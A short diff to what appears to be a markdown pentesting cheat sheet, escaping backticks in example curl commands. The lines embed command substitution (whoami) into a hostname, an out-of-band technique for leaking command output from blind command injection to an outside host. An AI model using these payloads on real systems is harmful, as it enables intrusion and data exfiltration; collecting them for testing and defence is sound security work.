@@ -831,7 +831,7 @@ https://nodejs.org/api/process.html
 
 curl http://$(whoami).site.com/
 
-curl http://`whoami`.site.com/
+curl http://\`whoami\`.site.com/
 
 ## Others tool's and things
   
